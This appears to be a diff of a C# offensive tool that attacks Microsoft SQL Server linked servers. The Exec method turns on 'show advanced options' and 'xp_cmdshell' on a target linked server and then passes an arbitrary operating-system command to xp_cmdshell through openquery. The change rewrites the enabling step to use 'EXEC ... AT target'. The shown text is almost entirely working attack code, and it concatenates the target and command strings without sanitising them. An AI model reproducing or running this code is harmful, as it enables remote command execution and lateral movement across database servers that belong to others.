@@ -12,7 +12,7 @@ namespace SQL
     {
         public static void Exec(String target, SqlConnection con, String cmd)
         {
-            String enable_xpcmd = "select 1 from openquery(\"" + target + "\", 'select 1; EXEC sp_configure ''show advanced options'',1; reconfigure; EXEC sp_configure ''xp_cmdshell'',1; reconfigure;');";
+            String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT " + target;
             String execCmd = "select * from openquery(" + target + ",'EXEC xp_cmdshell ''" + cmd + "'' WITH RESULT SETS ((output VARCHAR(MAX)))')";
 
             SqlCommand command = new SqlCommand(enable_xpcmd, con);
